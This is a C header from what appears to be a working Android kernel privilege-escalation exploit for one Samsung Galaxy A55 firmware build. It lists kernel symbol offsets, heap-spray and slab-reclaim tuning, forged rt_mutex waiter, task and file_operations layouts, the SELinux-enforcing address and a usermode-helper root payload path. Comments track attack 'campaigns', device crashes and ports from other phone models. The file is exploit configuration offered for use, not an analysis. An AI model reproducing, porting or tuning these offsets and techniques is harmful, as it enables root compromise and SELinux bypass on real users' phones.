#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "a55x-A556EXXUEDZE4-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#define APP_TRACEFS_SLIDE 1
/* Campaign 32: adopt the dm1q/gts9 device-proven order. The closed fops
 * route writes the fake file_operations directly through the ashmem alias,
 * so the fops payload page no longer targets the physical-P0 pipe oracle
 * (util.c prepare_skb_payload skips the p0 bank slots under
 * APP_CLOSED_FOPS_ROUTE). APP_FOPS_BEFORE_PIPE then defers the pipe arsenal
 * until after the configfs write primitive is verified, which skips the
 * pipe-first p0-oracle prep that preceded the campaign 31 panic. Tracefs
 * supplies the slide, so no P0 gate/probe oracle is used on this route. */
#define APP_CLOSED_FOPS_ROUTE 1
#define APP_FOPS_BEFORE_PIPE 1
/* Post-fops pipe physrw must use the pipe_buffer found in the reclaimed
 * page; never fall back to forging unrelated slots (dm1q/gts9 production). */
#define APP_EXACT_PIPE_BUFFER_ONLY 1
/* Replace the standard SKB/mm reclaim (the campaign 31 panic stage) with the
 * dm1q/gts9 controlled mm-group drain + 32-pair skb spray. The S918_*
 * constants below are the shared, device-independent reclaim tuning. */
#define APP_CONTROLLED_MM_GROUP_RECLAIM 1
#else
#define BUILD_VARIANT_LABEL "a55x-A556EXXUEDZE4-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a55xnsxx/essi:16/BP4A.251205.006/A556EXXUEDZE4:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define SKB_DATA_DELTA (-0xe80LL)
#define MM_STRUCT_SZ 0x400
#define MM_ORDER 3
#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3

/* Campaign 20 (windowfix): one order-3 fragment per slide send.
 * unix_stream_sendmsg splits a 0x10000 send at 0x8e80; chunk B's linear head
 * is markerless and its fragment carries the -0x1000 bias, so a 0x10000 send
 * gives the freed page a markerless second home (analysis gatemiss §2.4).
 * 0x8e80 produces exactly one fragment whose first user byte (0xe80) is page
 * offset 0, the SKB_DATA_DELTA=-0xe80 F1 geometry.  Slide-only: the pipe
 * oracle prep (pipe.c) and the later fops page keep their 0x10000 two-frag
 * spray. 4 -> 16 sends matches the other 0x8e80 targets and stays inside the
 * non-fresh 1 MiB SO_SNDBUF (16*0x8e80=0x8e800). */
#define SLIDE_SKB_SEND_SIZE 0x8e80
#define SKB_RECLAIM_SENDS 16

/* Controlled mm-group reclaim tuning (dm1q/gts9 shared set; mechanics only,
 * no UEDZE4-derived offsets). Required by APP_CONTROLLED_MM_GROUP_RECLAIM. */
#define S918_PAGE_SCAN_MAX 256
#define S918_KSNITCH_HINT_COLLISIONS 2
#define S918_KSNITCH_FULL_COLLISIONS 5
#define S918_DMA32_SKIP_SLABS 8
#define S918_TRIGGER_SLABS 24
#define S918_SKB_SENDS 256
#define S918_SKB_SNDBUF 8388608
#define S918_RECLAIM_SOCKET_PAIRS 32

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 1ULL
#define SLIDE_USE_FAKE_TASK 1
#define COMPACT_RT_MUTEX_WAITER 1
/* fixwave PR #303 tuning adoption (UEDZE4 device-validated; identical set
 * already field-validated on our e1s targets) — semantics device-independent
 * reclaim/trigger mechanics only; derived offsets and route geometry are
 * UEDZE4-local (kernel 6.1.157). The pselect sync/guard complex
 * (SLIDE_SYNC_PSELECT_SYSCALL + guard + trigger-age checks) is functionally
 * bound to APP_REQUIRE_FRESH_P0_SESSION in our slide_app.c wiring — adopt
 * that pair together in a later wave, not here. */
#define APP_SLIDE_RECLAIM_SENDS 192
#define APP_SLIDE_RECLAIM_SNDBUF 16777216
#define APP_MM_LATE_DRAIN_TRIGGERS 2
#define APP_DEFER_FINAL_DRAIN_REAP 1
#define APP_DEFER_ALL_DRAIN_REAPS 1
#define APP_QUIET_RECLAIM_WINDOW 1
#define APP_FOPS_PSELECT_DELAY_USEC 50000
#define SLIDE_TRACEFS_EVENT_ID 106
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dbc94ULL
#define SLIDE_PSELECT_WORD_SHIFT 3
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
/* PR #303 / e1s production pselect patience (ours was 100ms local choice) */
#define SLIDE_PSELECT_TIMEOUT_NSEC 500000000L
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8
#define APP_SLIDE_FRESH_PAGE_ATTEMPTS 8
#define APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES 16
#define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
#define APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES 16
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
/* one long-lived attempt instead of many short ones: every attempt exit is
 * a teardown/reset exposure moment (field evidence 3x download mode) */
#define DEFAULT_EXPLOIT_ATTEMPTS 1
#define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
#define APP_ACCEPT_SCHED_TRIGGER 1
/* Campaign 20: arm the pselect write window with a dedicated pipe read end
 * (read-set word g0) and a consumer kick after sched_setattr_tid; the gate
 * then requires slide_stack_write_window, not just the sched return
 * (analysis gatemiss §0.4/§5.2.3).  The window pipe replaces the timerfd,
 * which could only expire (ret=0) and never armed the window. */
#define APP_SLIDE_WINDOW_PIPE 1
/* Reject non-fresh mm candidates below PR #303's device-validated UEDZE4
 * partition; index 22 means the slab was not fully reclaimed (gatemiss §3). */
#define APP_SLIDE_MIN_OBJECT_INDEX 2
/* Bound fresh-page gate retries on a reclaim or window miss. */
#define APP_SLIDE_GATE_ATTEMPTS 3
#define SLIDE_KSNITCH_APPENDED_FUTEXES 4096
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define KERNELSNITCH_THRESHOLD_MULT 15
#define KERNELSNITCH_COLLISION_CONFIRMATIONS 5
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/a55x-A556EXXUEDZE4/p0_fingerprint.h"
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* Controlled mm-group zone classification (dm1q/gts9 values): the first
 * 128 MiB of the direct map is the DMA32 alias; the rest is normal. */
#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
#define MM_DMA32_ALIAS_END 0xffffff8080000000ULL
#define MM_NORMAL_ALIAS_START MM_DMA32_ALIAS_END
#define MM_NORMAL_ALIAS_END KERNELSNITCH_IDENTITY_END

#define ASHMEM_MISC_FOPS_OFF 0x02464430ULL
#define ASHMEM_FOPS_OFF 0x013c9b50ULL
#define ASHMEM_IOCTL_OFF 0x00d2d4f8ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00d2de30ULL
#define ASHMEM_MMAP_OFF 0x00d2de88ULL
#define ASHMEM_OPEN_OFF 0x00d2e0a8ULL
#define ASHMEM_RELEASE_OFF 0x00d2e130ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00d2e250ULL
#define CONFIGFS_READ_ITER_OFF 0x0046cce8ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0046d218ULL
#define COPY_SPLICE_READ_OFF 0x003ec8a0ULL
#define NOOP_LLSEEK_OFF 0x0039ec9cULL
#define INIT_TASK_OFF 0x022df700ULL
#define ROOT_TASK_GROUP_OFF 0x024f4d40ULL
#define SELINUX_ENFORCING_OFF 0x025c92f8ULL
#define KMALLOC_CACHES_OFF 0x01792ed8ULL
#define ANON_PIPE_BUF_OPS_OFF 0x0120c610ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d4360ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x022cae60ULL
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x7800
#define ROOT_UMH_DATA_OFF 0x7a00

#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x016ca0d5ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x022d29e0ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0241e878ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x026b0518ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Payload-page layout adopted from the field-validated a54x fork (commit
 * ba37fed; Tab S9 FE V2->V3 evidence): FOPS_OFF 0x2000 overlapped the pipe
 * buffer area -> intermittent try_module_get crash at the fops stage; the
 * UMH scratch moved with it to keep the table clear. Our pipe.c
 * PHYSRW_PROOF_OFF (0x7000) shares the fops offset exactly as the fork's
 * own committed state does (fork pipe.c:8 + target.h FOPS_OFF 0x7000):
 * the proof tags are saved+restored around the physrw check, so the fops
 * table written later at the same offset never collides with live proof
 * bytes. LOCK/W0/SCRATCH/RIGHT/LEFT/FAKE_TASK offsets are untouched. */
#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x7000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_PRIO_OFF 0x44
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_WW_CTX_OFF 0x50
#define FAKE_WAITER_LAYOUT_SIZE 0x58

#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x348
#define FAKE_TASK_PI_LOCK_OFF 0x924
#define FAKE_TASK_PI_WAITERS_OFF 0x938
#define FAKE_TASK_PI_TOP_TASK_OFF 0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950

#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x28
#define POOL_NR_IDLE_OFF 0x3c

#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
